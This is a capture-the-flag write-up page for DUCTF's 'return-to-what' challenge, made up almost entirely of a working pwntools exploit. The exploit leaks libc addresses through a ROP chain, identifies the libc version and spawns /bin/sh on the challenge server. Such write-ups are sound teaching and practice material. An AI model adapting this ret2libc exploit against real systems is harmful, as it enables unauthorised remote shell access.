@@ -1,0 +1,77 @@
+<!DOCTYPE html><html><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width"/><meta name="next-head-count" content="2"/><link rel="preload" href="/_next/static/css/612a222fb0c8327bc985.css" as="style"/><link rel="stylesheet" href="/_next/static/css/612a222fb0c8327bc985.css" data-n-g=""/><link rel="preload" href="/_next/static/css/670b2ba76521e264e24c.css" as="style"/><link rel="stylesheet" href="/_next/static/css/670b2ba76521e264e24c.css" data-n-p=""/><noscript data-n-css=""></noscript><link rel="preload" href="/_next/static/chunks/main-716454fbc5f967e07bd2.js" as="script"/><link rel="preload" href="/_next/static/chunks/webpack-e067438c4cf4ef2ef178.js" as="script"/><link rel="preload" href="/_next/static/chunks/framework.cdbdac0a36200f52203c.js" as="script"/><link rel="preload" href="/_next/static/chunks/99f422a92ff7083adb8a7d840734144fa7589f68.7cc229cc9d165929cc42.js" as="script"/><link rel="preload" href="/_next/static/chunks/pages/_app-bffba6408cd4aa04210c.js" as="script"/><link rel="preload" href="/_next/static/chunks/pages/blog/return-to-what-4daf8cce592ca9993330.js" as="script"/></head><body><div id="__next"><div class="post_post__1Lsln"><h1>return-to-what (DUCTF)</h1><h6>September 21, 2020</h6><p>Unknown libc version. Leaked multiple addresses of libc functions. Offsets between functions were used to identify the correct libc version, using libc.rip.</p><div class="post_codeblock__jpvW3"><pre><code>from pwn import *
+
+# local
+#target = process(&#x27;./return-to-what&#x27;)
+#libc = ELF(&#x27;/usr/lib/libc.so.6&#x27;)
+
+# remote nc chal.duc.tf 30003
+target = remote(&#x27;chal.duc.tf&#x27;, 30003)
+libc = ELF(&#x27;libc-2.27.so&#x27;) # identified using libc.rip
+
+pop_rdi = 0x40122b
+got_puts = 0x404018
+got_gets = 0x404020
+got_libc_start_main = 0x403ff0
+plt_puts = 0x401030
+ret = 0x401016
+start = 0x401060
+
+payload = b&#x27;&#x27;
+payload += b&#x27;A&#x27;*56
+payload += p64(pop_rdi)
+payload += p64(got_puts) # leak addr
+payload += p64(plt_puts) # print address of puts in libc
+payload += p64(start) # restart
+
+target.recv() # Where would you like to return to?
+target.sendline(payload)
+
+libc_puts = int.from_bytes((target.recvuntil(b&#x27;\\n&#x27;)[:-1]), byteorder=&#x27;little&#x27;)
+print(&#x27;puts: &#x27; + hex(libc_puts))
+
+payload = b&#x27;&#x27;
+payload += b&#x27;A&#x27;*56
+payload += p64(pop_rdi)
+payload += p64(got_gets) # leak addr
+payload += p64(plt_puts) # print address of puts in libc
+payload += p64(start) # restart
+
+target.recv() # Where would you like to return to?
+target.sendline(payload)
+
+libc_gets = int.from_bytes((target.recvuntil(b&#x27;\\n&#x27;)[:-1]), byteorder=&#x27;little&#x27;)
+print(&#x27;gets: &#x27; + hex(libc_gets))
+
+payload = b&#x27;&#x27;
+payload += b&#x27;A&#x27;*56
+payload += p64(pop_rdi)
+payload += p64(got_libc_start_main) # leak addr
+payload += p64(plt_puts) # print address of puts in libc
+payload += p64(start) # restart
+
+target.recv() # Where would you like to return to?
+target.sendline(payload)
+
+start = int.from_bytes((target.recvuntil(b&#x27;\\n&#x27;)[:-1]), byteorder=&#x27;little&#x27;)
+print(&#x27;__libc_start_main: &#x27; + hex(start))
+
+# Use https://libc.rip/ to identify libc version
+# libc.rip identified libc version as libc6_2.27-3ubuntu1_amd64
+
+
+libc.address = libc_puts - libc.symbols[&#x27;puts&#x27;]
+print(&#x27;libc puts&#x27; + hex(libc.symbols[&#x27;puts&#x27;]))
+
+bin_sh = next(libc.search(b&#x27;/bin/sh&#x27;))
+libc_system = libc.symbols[&#x27;system&#x27;]
+
+payload = b&#x27;&#x27;
+payload += b&#x27;A&#x27; * 56
+payload += p64(pop_rdi)
+payload += p64(bin_sh)
+payload += p64(ret)
+payload += p64(libc_system)
+
+target.sendline(payload)
+target.interactive()
+</code></pre></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{}},"page":"/blog/return-to-what","query":{},"buildId":"3LkWVrF5Wd0TevBs6KKBj","nextExport":true,"autoExport":true,"isFallback":false}</script><script nomodule="" src="/_next/static/chunks/polyfills-83732ebf2ed7f8a1b2c7.js"></script><script src="/_next/static/chunks/main-716454fbc5f967e07bd2.js" async=""></script><script src="/_next/static/chunks/webpack-e067438c4cf4ef2ef178.js" async=""></script><script src="/_next/static/chunks/framework.cdbdac0a36200f52203c.js" async=""></script><script src="/_next/static/chunks/99f422a92ff7083adb8a7d840734144fa7589f68.7cc229cc9d165929cc42.js" async=""></script><script src="/_next/static/chunks/pages/_app-bffba6408cd4aa04210c.js" async=""></script><script src="/_next/static/chunks/pages/blog/return-to-what-4daf8cce592ca9993330.js" async=""></script><script src="/_next/static/3LkWVrF5Wd0TevBs6KKBj/_buildManifest.js" async=""></script><script src="/_next/static/3LkWVrF5Wd0TevBs6KKBj/_ssgManifest.js" async=""></script></body></html>
